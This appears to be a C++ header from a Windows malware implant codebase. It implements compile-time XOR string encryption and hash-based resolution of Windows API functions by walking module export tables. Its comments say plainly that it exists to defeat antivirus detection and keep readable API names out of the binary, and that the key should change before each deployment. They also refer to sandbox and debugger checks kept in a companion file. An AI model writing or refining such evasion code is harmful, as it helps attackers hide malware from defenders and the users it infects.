// obfuscate.hpp — Compile-time XOR string obfuscation + PEB-based API hash resolution
//
// USAGE:
//   XS("hello")          -> XorStr<N> decrypts on first .str() / implicit cast
//   XSW(L"hello")        -> XorStrW<N> wide variant
//   FNV("WinHttpOpen")   -> uint32_t compile-time hash
//   HashProc(hMod, hash) -> FARPROC resolved via PEB export walk, no name string
//   HASHPROC(mod, Name)  -> typed pointer shorthand
//
// KEY: change GHOST_XOR_KEY before deployment.
//
#pragma once
#include <windows.h>
#include <cstdint>
#include <cstring>

// ─── 4-byte rotating XOR key (change K0-K3 before each build) ───────────────
// ponytail: rotating key defeats single-byte AV XOR inversion; 4 bytes is enough
constexpr uint8_t GHOST_K0 = 0xA7u;
constexpr uint8_t GHOST_K1 = 0x3Eu;
constexpr uint8_t GHOST_K2 = 0xC1u;
constexpr uint8_t GHOST_K3 = 0x58u;
constexpr uint8_t ghost_key(size_t i) {
    return (i & 3) == 0 ? GHOST_K0 : (i & 3) == 1 ? GHOST_K1 : (i & 3) == 2 ? GHOST_K2 : GHOST_K3;
}

// ─── Compile-time FNV-1a 32-bit hash ────────────────────────────────────────
constexpr uint32_t fnv1a_impl(const char* s, uint32_t h) {
    return (*s == '\0') ? h : fnv1a_impl(s + 1, (h ^ static_cast<uint8_t>(*s)) * 0x01000193u);
}
constexpr uint32_t fnv1a(const char* s) {
    return fnv1a_impl(s, 0x811c9dc5u);
}
#define FNV(s) (fnv1a(s))

// ─── Narrow XorStr<N> ────────────────────────────────────────────────────────
template<size_t N>
struct XorStr {
    mutable char buf[N];

    constexpr XorStr(const char (&src)[N]) : buf{} {
        for (size_t i = 0; i < N; ++i)
            buf[i] = static_cast<char>(static_cast<unsigned char>(src[i]) ^ ghost_key(i));
    }

    const char* str() const {
        for (size_t i = 0; i < N - 1; ++i)
            buf[i] = static_cast<char>(static_cast<unsigned char>(buf[i]) ^ ghost_key(i));
        buf[N - 1] = '\0';
        return buf;
    }

    operator const char*() const { return str(); }

    ~XorStr() {
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = '\0';
    }

    XorStr(const XorStr&) = delete;
    XorStr& operator=(const XorStr&) = delete;
};

#define XS(literal) (XorStr<sizeof(literal)>(literal))

// ─── Wide XorStrW<N> ─────────────────────────────────────────────────────────
template<size_t N>
struct XorStrW {
    mutable wchar_t buf[N];

    constexpr XorStrW(const wchar_t (&src)[N]) : buf{} {
        for (size_t i = 0; i < N; ++i)
            buf[i] = static_cast<wchar_t>(static_cast<unsigned>(src[i]) ^ ghost_key(i));
    }

    const wchar_t* str() const {
        for (size_t i = 0; i < N - 1; ++i)
            buf[i] = static_cast<wchar_t>(static_cast<unsigned>(buf[i]) ^ ghost_key(i));
        buf[N - 1] = L'\0';
        return buf;
    }

    operator const wchar_t*() const { return str(); }

    ~XorStrW() {
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = L'\0';
    }

    XorStrW(const XorStrW&) = delete;
    XorStrW& operator=(const XorStrW&) = delete;
};

#define XSW(literal) (XorStrW<sizeof(literal)/sizeof(wchar_t)>(literal))

// ─── PEB-based API hash resolution ──────────────────────────────────────────
// Walks the loaded module's export table and compares FNV-1a(name) against
// targetHash. Zero string comparison in the binary — only hashes.
//
// Forwarder exports (e.g. ole32!CoCreateInstance → "combase.CoCreateInstance"
// on Win10/11) are pointers to an ASCII string, NOT to code. Calling one
// executes a data page → instant ACCESS_VIOLATION. When the matched RVA falls
// inside the export directory, resolve the forwarder target module and
// recurse. Depth-capped against forwarder cycles.
inline FARPROC HashProc(HMODULE hMod, uint32_t targetHash, int depth = 0) {
    if (!hMod || depth > 4) return nullptr;
    auto base = reinterpret_cast<const uint8_t*>(hMod);

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto& expDataDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDataDir.VirtualAddress) return nullptr;

    auto exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
        base + expDataDir.VirtualAddress);

    auto names    = reinterpret_cast<const DWORD*>(base + exp->AddressOfNames);
    auto ordinals = reinterpret_cast<const WORD*> (base + exp->AddressOfNameOrdinals);
    auto funcs    = reinterpret_cast<const DWORD*>(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (fnv1a(name) == targetHash) {
            DWORD fnRva = funcs[ordinals[i]];

            // Forwarder: RVA points into the export directory itself.
            if (fnRva >= expDataDir.VirtualAddress &&
                fnRva <  expDataDir.VirtualAddress + expDataDir.Size) {
                const char* fwd = reinterpret_cast<const char*>(base + fnRva);
                char modName[64];
                size_t j = 0;
                while (fwd[j] && fwd[j] != '.' && j < sizeof(modName) - 1) {
                    modName[j] = fwd[j];
                    ++j;
                }
                if (fwd[j] != '.' || j == 0) return nullptr; // malformed / #ordinal form
                modName[j] = '\0';
                HMODULE hTarget = GetModuleHandleA(modName);
                if (!hTarget) hTarget = LoadLibraryA(modName);
                if (!hTarget) return nullptr;
                return HashProc(hTarget, fnv1a(fwd + j + 1), depth + 1);
            }

            return reinterpret_cast<FARPROC>(
                const_cast<uint8_t*>(base + fnRva));
        }
    }
    return nullptr;
}

// Typed shorthand: HASHPROC(hKernel32, CreateProcessW)
// Returns a correctly typed function pointer, no cast needed at call site.
#define HASHPROC(mod, name) \
    reinterpret_cast<decltype(&name)>(HashProc((mod), FNV(#name)))

// ─── NOTE ────────────────────────────────────────────────────────────────────
// GhostSleep is defined as a static function in evasion.cpp (owns the cached
// pfnNtDelay pointer). GhostIsDebugged is in evasion.cpp via SandboxCheck.
// Do NOT redeclare them here — same-TU include would cause redefinition errors.
